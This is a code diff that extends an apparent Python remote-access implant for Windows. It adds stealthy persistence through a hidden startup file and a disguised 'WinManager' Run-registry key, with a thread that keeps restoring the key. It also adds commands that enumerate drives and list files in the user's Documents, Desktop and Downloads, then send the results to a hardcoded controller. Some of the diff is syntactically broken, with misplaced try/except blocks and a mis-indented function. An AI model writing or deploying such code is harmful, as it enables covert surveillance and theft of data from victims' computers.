@@ -7,6 +7,9 @@ import json
 import platform
 import socket
 import time
+import ctypes
+import winreg
+import threading
 
 def establish_persistence():
     """Copies the script to the local drive and adds it to Windows Startup."""
@@ -34,10 +37,95 @@ def establish_persistence():
         if not os.path.exists(bat_path):
             with open(bat_path, "w") as f:
                 # Use 'pythonw' if you want it to be invisible, or 'python' for testing
-                f.write(f'@echo off\npython "{target_file}"')
+                f.write(f'@echo off\npythonw "{target_file}"')
             print("[*] Persistence established in Startup folder.")
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
+        winreg.CloseKey(key)
+        print("[*] Registry persistence added.")
+    except Exception as e:
+        print(f"[-] Registry persistence failed: {e}")
     except Exception as e:
         print(f"[-] Persistence failed: {e}")
+    return target_file
+
+def check_persistence(target_file):
+    while True:
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
+            value, _ = winreg.QueryValueEx(key, 'WinManager')
+            winreg.CloseKey(key)
+            expected = f'pythonw "{target_file}"'
+            if value != expected:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected)
+                winreg.CloseKey(key)
+                print("[*] Persistence key corrected.")
+        except FileNotFoundError:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
+            winreg.CloseKey(key)
+            print("[*] Persistence key restored.")
+        except Exception as e:
+            print(f"[-] Persistence check failed: {e}")
+        time.sleep(300)
+
+def explore_drives():
+    kernel32 = ctypes.windll.kernel32
+    GetDriveType = kernel32.GetDriveTypeW
+    DRIVE_FIXED = 3
+    DRIVE_REMOVABLE = 2
+    drives = {}
+    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+        path = f'{letter}:\\'
+        if os.path.exists(path):
+            type_code = GetDriveType(path)
+            if type_code == DRIVE_FIXED:
+                if letter == 'C':
+                    type_str = 'system'
+                else:
+                    type_str = 'secondary'
+            elif type_code == DRIVE_REMOVABLE:
+                type_str = 'mobile'
+            else:
+                continue
+            try:
+                dirs = list_dirs(path, max_depth=3)
+                drives[letter] = {'type': type_str, 'dirs': dirs}
+            except Exception as e:
+                print(f"[-] Failed to explore {letter}: {e}")
+    return drives
+
+def list_dirs(path, depth=0, max_depth=3):
+    result = []
+    if depth >= max_depth:
+        return result
+    try:
+        for item in os.listdir(path):
+            full = os.path.join(path, item)
+            if os.path.isdir(full):
+                result.append(full)
+                result.extend(list_dirs(full, depth+1, max_depth))
+    except (PermissionError, OSError):
+        pass
+    return result
+
+def harvest_user():
+    userprofile = os.getenv('USERPROFILE')
+    targets = ['Documents', 'Desktop', 'Downloads']
+    result = {}
+    for target in targets:
+        path = os.path.join(userprofile, target)
+        if os.path.exists(path):
+            result[target] = []
+            try:
+                for root, dirs, files in os.walk(path):
+                    for file in files:
+                        result[target].append(os.path.join(root, file))
+            except (PermissionError, OSError):
+                pass
+    return result
 
 def get_username() -> str:
     try:
@@ -97,6 +185,22 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                         return
                     elif command == 'PING':
                         client.sendall(b'PING_OK\n')
+                    elif command == 'EXPLORE_DRIVES':
+                        try:
+                            report = explore_drives()
+                            json_report = json.dumps(report)
+                            client.send(f"EXPLORE_SIZE {len(json_report)}\n".encode())
+                            client.sendall(json_report.encode())
+                        except Exception as e:
+                            print(f"[-] EXPLORE_DRIVES failed: {e}")
+                    elif command == 'HARVEST_USER':
+                        try:
+                            report = harvest_user()
+                            json_report = json.dumps(report)
+                            client.send(f"HARVEST_SIZE {len(json_report)}\n".encode())
+                            client.sendall(json_report.encode())
+                        except Exception as e:
+                            print(f"[-] HARVEST_USER failed: {e}")
                     else:
                         print(f'[?] Received: {command}')
         
@@ -119,7 +223,9 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
 
 if __name__ == '__main__':
     # Initialize Persistence FIRST
-    establish_persistence()
+    target_file = establish_persistence()
+    
+    threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
     
     # Define Hub Details (Change the IP here to your King's IP)
     HUB_IP = '192.168.100.9' 
@@ -127,7 +233,7 @@ if __name__ == '__main__':
     
     connect_to_hub(HUB_IP, HUB_PORT)
 
-def exfiltrate_file(file_path):
+    def exfiltrate_file(file_path):
     if os.path.exists(file_path):
         with open(file_path, "rb") as f:
             data = f.read()
